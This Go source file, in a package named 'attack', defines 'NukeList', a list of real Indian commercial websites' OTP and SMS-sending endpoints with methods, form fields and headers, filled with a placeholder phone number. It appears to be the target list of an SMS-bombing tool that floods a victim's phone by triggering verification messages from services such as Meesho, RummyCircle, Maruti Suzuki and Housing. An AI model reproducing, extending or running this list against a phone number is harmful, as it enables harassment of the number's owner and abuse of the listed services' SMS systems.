package attack

import (
	"net/url"
)

type NukeStruct struct {
    Name    string 
    Link    string   
	Method  string 
    Data    url.Values 
	Headers map[string]string
}


var NukeList []NukeStruct = []NukeStruct{
    
	// MEESHO
	{
		Name : "Meesho",
		Method: "POST",
		Link : "https://www.meesho.com/api/v1/user/login/request-otp",
		Data: url.Values{	
					"instance_id" :{"49b49a03-c74d-4074-82d1-b873dcc2"},
					"is_logged_in" : {"false"},
					"phone_number" : {"6969696969"},
					"request_id" : {"b3M.v3pyQaXeep"},
					"resend_otp_wait_time" : {"2"},
				},
		Headers : map[string]string{
					"Content-Type" : "application/x-www-form-urlencoded",
				},
	},

	// RUMMY
	{
		Name : "Rummy",
		Method : "POST",
		Link : "https://www.rummycircle.com/api/fl/auth/v3/getOtp" ,
		Data : url.Values{	
					"deviceId": {"aefecb07-919c-42bb-80ed-9c6337664d7f"},
					"deviceName" : {""},
					"isPlaycircle" : {"false"},
					"mobile" : {"6969696969"},
					"refCode" : {""},
				},
		Headers: map[string]string{
					"Content-Type" : "application/x-www-form-urlencoded",
				},
	},

	// MY 11 CIRCLE
	{
		Name : "MY 11 Circle",
		Method : "POST",
		Link : "https://www.my11circle.com/api/fl/auth/v3/getOtp" ,
		Data : url.Values{	
					"deviceId": {"1d5a4caf-f61f-4c37-a6fb-be1e99912543"},
					"deviceName" : {""},
					"isPlaycircle" : {"false"},
					"mobile" : {"6969696969"},
					"refCode" : {""},
				},
		Headers: map[string]string{
					"Content-Type" : "application/x-www-form-urlencoded",
				},
	},

	// MARUTI
	{
		Name : "Maruti",
		Method : "POST",
		Link : "https://www.marutisuzuki.com/api/sitecore/QuickLinks/SendOTP/?value=1",
		Data : url.Values{	
					"phoneNumber" : {"6969696969"},
				},
		Headers: map[string]string{
					"Content-Type" : "application/x-www-form-urlencoded",
				},
	},

	//NETMEDS
	{
		Name : "Netmeds",
		Method: "GET",
		Link : "https://www.netmeds.com/mst/rest/v1/id/details/"+"6969696969",
		Data : url.Values{},
		Headers: dumMap,
	},

	//TRUVAL
	{
		Name : "Truvalue",
		Method: "POST",
		Link : "https://www.marutisuzukitruevalue.com/api/sitecore/UserAccount/SendOTPForLogin",
		Data : url.Values{
					"mobile" : {"6969696969"},
				},
		Headers : map[string]string{
					"Content-Type" : "application/x-www-form-urlencoded",
				},
	},

	// SDL India 
	{
		Name : "SDL India",
		Method : "POST",
		Link : "https://sdlindia.com/?option=smsalert-registration-with-mobile",
		Data : url.Values{
					"billing_phone" : {"6969696969"},
					"redirect" : {},
					"smsalert_name": {"32427"},
					"smsalert_signupwithmobile_nonce" : {"b31d804009"},
					"_wp_http_referer" : {"%2Fsignup-with-otp%2F"},
				},
		Headers:  map[string]string{
					"Content-Type" : "application/x-www-form-urlencoded",
				},
	},

	// HOUSING
	{
		Name : "Housing",
		Method : "POST",
		Link : "https://login.housing.com/api/v2/send-otp",
		Data : url.Values{
					"phone": {"6969696969"},
				},
		Headers : dumMap,
	},

	

	{
		Name : "Confirm Tkt",
		Method : "GET",
		Link : "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="+"6969696969",
		Data : url.Values{},
		Headers : map[string]string{
			"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.3",
			"Accept-Encoding" : "none",
			"Accept-Language" : "en-US,en;q=0.8",
			"Connection" : "keep-alive",
		},
	},


	{
		Name : "Naaptol",
		Method : "GET",
		Link : "https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="+"6969696969",
		Data : url.Values{},
		Headers : map[string]string{
			"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.3",
			"Accept-Encoding" : "none",
			"Accept-Language" : "en-US,en;q=0.8",
			"Connection" : "keep-alive",
		},
	},

	// {
	// 	Name : ,
	// 	Method : "POST",
	// 	Link : https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/,
	// 	Data : url.Values,
	// 	Headers : dumMap,
	// }


}


